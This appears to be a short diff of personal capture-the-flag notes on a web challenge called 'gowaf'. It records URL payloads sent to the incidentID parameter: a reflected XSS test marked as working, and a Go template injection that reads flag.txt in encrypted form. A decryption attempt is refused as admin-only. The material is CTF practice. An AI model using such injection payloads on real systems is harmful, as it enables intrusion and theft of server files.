@@ -1,0 +1,18 @@
+https://gowaf.appsecil.ctf.today/docs
+	func ReadFileEncrypted(fileLocation string) string
+	func Encrypt(input string) string
+	func Decrypt(input string) string
+
+Try login
+	"
+	asd
+https://gowaf.appsecil.ctf.today/blocked?incidentID=%23682922
+
+https://gowaf.appsecil.ctf.today/blocked?incidentID=%3Cscript%3Ealert(1)%3C/script%3E
+	Worked
+
+https://gowaf.appsecil.ctf.today/blocked?incidentID={{ReadFileEncrypted%20%22flag.txt%22}}
+	AAAAAAAAAAAAAA5dCV8kZB9WND5VCUZOMwMN
+
+https://gowaf.appsecil.ctf.today/blocked?incidentID={{Decrypt%20%22AAAAAAAAAAAAAA5dCV8kZB9WND5VCUZOMwMN%22}}
+	Only admins can use the decryption function
